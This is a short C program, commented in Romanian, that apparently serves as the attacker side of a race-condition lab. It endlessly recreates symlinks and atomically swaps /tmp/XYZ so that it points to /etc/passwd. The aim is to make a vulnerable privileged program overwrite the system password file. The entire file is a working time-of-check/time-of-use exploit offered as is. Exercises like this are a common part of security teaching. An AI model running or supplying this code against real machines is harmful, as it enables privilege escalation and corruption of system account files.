#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
int main(){
    //creez o bucla infinta care va face unlink la tmp/XYZ iar apoi il 
    //va adauga ca legatura simbolica la /etc/passwd
    unsigned int flags = RENAME_EXCHANGE;
    for(int i=0;; i++){
        //facem opratiile unlink si symlink atomice
        unlink("/tmp/XYZ"); symlink("/dev/null", "/tmp/XYZ");
        unlink("/tmp/ABC"); symlink("/etc/passwd","/tmp/ABC");
        //interschimbam atomic doua legaturi simbolice - ceea ce ne permite sa schimbam unde
        //indica "/tmp/XYZ" fara a introduce nici o conditie de concurs
        renameat2(0, "/tmp/XYZ", 0 , "/tmp/ABC", flags);
        printf("Run symlink for %d times\n",i); //printam numarul de iteratii facute
   }

    return 0;
}
